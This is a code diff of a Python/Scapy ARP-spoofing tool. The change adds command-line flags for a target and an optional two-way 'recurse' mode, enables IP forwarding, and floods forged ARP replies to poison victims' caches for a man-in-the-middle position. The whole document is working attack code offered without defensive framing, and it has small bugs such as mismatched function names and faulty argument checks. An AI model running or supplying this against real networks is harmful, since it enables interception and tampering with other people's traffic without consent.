@@ -1,12 +1,8 @@
-from ipaddress import ip_address
-from scapy.all import Ether, ARP, srp, send
-import argparse
+from scapy.all import Ether, ARP, srp, send, sniff
 import time
-import os
 import sys
-#https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
+
 def enable_linux_iproute():
-    #Enables IP route ( IP Forward ) in linux-based distro
     file_path = "/proc/sys/net/ipv4/ip_forward"
     with open(file_path) as f:
         if f.read() == 1:
@@ -31,8 +27,7 @@ def get_mac_address(ip):
 
 def spoof(target_ip,host_ip, verbose=True):
     target_mac_address = get_mac_address(target_ip)
-    #now to craft the response
-    #We'll need the 'is-at' op code in the packet (response)
+    #now to craft the response, We'll need the 'is-at' op code in the packet (response)
     #we don't care about hwsrc (hardware source MAC address)
     #By default the hwsrc (hardware source) is the address of the sender (us)
     arp_response = ARP(pdst=target_ip, hwdst=target_mac_address,psrc=host_ip,op='is-at')
@@ -43,50 +38,89 @@ def spoof(target_ip,host_ip, verbose=True):
         print("[+++]\nSent to {} : {} is-at {}  \n[+++]".format(target_ip, host_ip, self_mac))
 
 def restore(target_ip, host_ip, verbose=True):
-    #Restores the normal process of a regular network
-    #This is done by sending back the original information(s)
-    #Real IP & MAC of host_ip to target_ip
-
-    #Get the real MAC of the target
     target_mac = get_mac_address(target_ip)
     #Get the real MAC address of spoofed (gateway)
     host_mac = get_mac_address(host_ip)
     #crafting the restoring packet
     arp_response = ARP(pdst=target_ip,hwdst=target_mac,psrc=host_ip,hwsrc=host_mac,op="is-at")
-
     #Now to send the packet to restore the network
     send(arp_response,verbose=1,count=6)#sent 6 times just for good measure
     if verbose:
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
-if len(sys.argv) == 2:
-    if(sys.argv) == '-h':
-        print('help Menu...')
-if len(sys.argv) == 3:
-    try:
-        spoof_target = ip_address(sys.argv[1])
-        spoof_host = ip_address(sys.argv[2])
-    except:
-        print('Value Error')
-        exit()
+
+def myARP():
+    # print(f"Args: {sys.argv}")
+    if sys.argv != 1:
+        for i in range(len(sys.argv)):
+            r_flag = False
+            host = '127.0.0.1'
+            argument = sys.argv[i]
+            if argument == sys.argv[0]:
+                # print("Skipping filename")
+                continue
+            if argument[0] == '-':
+                match argument:
+                    case "-t": 
+                        # print(f"target flag, next: {sys.argv[i + 1]}")
+                        target = sys.argv[i + 1]
+                        i += 1
+                    case "-r": 
+                        # print(f"recurse flag, next: {sys.argv[i + 1]}")
+                        r_flag = True
+                        host = sys.argv[i + 1]
+                        i += 1
+                    case _:
+                        print("Unrecognized flag (only accepts -r and -t)")
+        while True:
+            try:
+                if not r_flag:
+                    spoof(target, host, 1)
+                else:
+                    spoof(target, host, 1)
+                    spoof(host, target, 1)
+                time.sleep(1)
+            except KeyboardInterrupt:
+                print("[!] Detected CTRL+C ! restoring the network, please wait...")
+                restore(target, host)
+                restore(host, target)
 
 
 if __name__ == "__main__":
     enable_ip_route()
-    verbose=1
-    # target = '10.5.26.23'
-    # host = '10.5.117.179'
-    target = input("Enter target IP address: ")
-    host = input("Enter host IP address: ")
-    try:
+    # print(f"Args: {sys.argv}")
+    if sys.argv != 1:
+        r_flag = False
+        host = '127.0.0.1'
+        for i in range(len(sys.argv)):
+            argument = sys.argv[i]
+            if argument == sys.argv[0]:
+                # print("Skipping filename")
+                continue
+            if argument[0] == '-':
+                match argument:
+                    case "-t": 
+                        # print(f"target flag, next: {sys.argv[i + 1]}")
+                        target = sys.argv[i + 1]
+                        i += 1
+                    case "-r": 
+                        print(f"recurse flag, next: {sys.argv[i + 1]}")
+                        r_flag = True
+                        host = sys.argv[i + 1]
+                        i += 1
+                    case _:
+                        print("Unrecognized flag (only accepts -r and -t)")
+        print(f"Spoofing target: {target} host: {host}")
         while True:
-            #telling the target we are now the host
-            spoof(target,host,verbose)
-            #telling the host that we are the target
-            spoof(host,target,verbose)
-            #sleep
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        restore(target, host)
-        restore(host, target)
+            try:
+                if not r_flag:
+                    spoof(target, host, 1)
+                else:
+                    spoof(target, host, 1)
+                    spoof(host, target, 1)
+                time.sleep(1)
+            except KeyboardInterrupt:
+                print("[!] Detected CTRL+C ! restoring the network, please wait...")
+                restore(target, host)
+                restore(host, target)
+                print("[!] Network restored")
